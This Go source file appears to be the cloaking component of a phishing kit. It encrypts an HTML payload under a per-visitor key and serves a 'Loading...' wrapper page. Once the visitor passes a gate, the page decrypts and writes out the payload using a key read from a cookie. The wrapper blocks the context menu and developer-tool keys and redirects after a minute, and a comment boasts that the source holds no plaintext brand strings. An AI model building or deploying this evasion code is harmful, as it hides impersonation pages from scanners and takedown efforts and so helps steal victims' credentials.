package core

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"strconv"
	"strings"
	"sync"
)

// KeyStore holds per-token AES-256-GCM keys. A key is created when a token
// passes the gate and deleted once the payload is served.
type KeyStore struct {
	mu   sync.Mutex
	keys map[string][]byte
}

func NewKeyStore() *KeyStore {
	return &KeyStore{keys: make(map[string][]byte)}
}

func (ks *KeyStore) Put(token string) []byte {
	k := make([]byte, 32)
	rand.Read(k)
	ks.mu.Lock()
	ks.keys[token] = k
	ks.mu.Unlock()
	return k
}

func (ks *KeyStore) Get(token string) []byte {
	ks.mu.Lock()
	defer ks.mu.Unlock()
	return ks.keys[token]
}

func (ks *KeyStore) Delete(token string) {
	ks.mu.Lock()
	delete(ks.keys, token)
	ks.mu.Unlock()
}

// SealPayload AES-GCM encrypts html under key and returns:
//   - chunks: base64 ciphertext split into "ct += \"...\";" lines
//   - ivHex:  24-char hex string of the 12-byte nonce
func SealPayload(html, key []byte) (chunks, ivHex string, err error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", "", err
	}
	iv := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(iv); err != nil {
		return "", "", err
	}
	ct := gcm.Seal(nil, iv, html, nil)
	enc := base64.StdEncoding.EncodeToString(ct)

	var b strings.Builder
	for i := 0; i < len(enc); i += 80 {
		end := i + 80
		if end > len(enc) {
			end = len(enc)
		}
		b.WriteString("ct += ")
		b.WriteString(strconv.Quote(enc[i:end]))
		b.WriteString(";\n")
	}
	return b.String(), hex.EncodeToString(iv), nil
}

// BuildGatedWrapper returns the loader page. It reads the __k cookie, imports
// it as an AES-GCM key, decrypts ct, and document.writes the plaintext.
// The served source contains no plaintext brand strings and no HTML payload.
func BuildGatedWrapper(chunks, ivHex, redirectURL string) []byte {
	var redirect string
	if redirectURL != "" {
		redirect = "\nsetTimeout(function(){location.href=" + strconv.Quote(redirectURL) + ";},60000);\n"
	}
	header := `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Loading...</title>
<script>
document.addEventListener("contextmenu",function(e){e.preventDefault();});
document.onkeydown=function(e){if(e.keyCode===123)return false;if(e.ctrlKey&&e.shiftKey&&(e.keyCode===73||e.keyCode===74||e.keyCode===67))return false;};
</script></head><body><script>
let ct="";
`
	footer := `
(async function(){
  const m = document.cookie.match(/(?:^|;\s*)__k=([^;]+)/);
  if (!m) { document.body.textContent = "Session expired"; return; }
  const b64 = m[1].replace(/-/g,"+").replace(/_/g,"/");
  const raw = Uint8Array.from(atob(b64), c=>c.charCodeAt(0));
  const key = await crypto.subtle.importKey("raw", raw, {name:"AES-GCM"}, false, ["decrypt"]);
  const iv  = Uint8Array.from("` + ivHex + `".match(/../g), h=>parseInt(h,16));
  const buf = Uint8Array.from(atob(ct), c=>c.charCodeAt(0));
  const plain = await crypto.subtle.decrypt({name:"AES-GCM", iv: iv}, key, buf);
  document.open();
  document.write(new TextDecoder().decode(plain));
  document.close();
})();
` + redirect + `
</script></body></html>`
	return []byte(header + chunks + footer)
}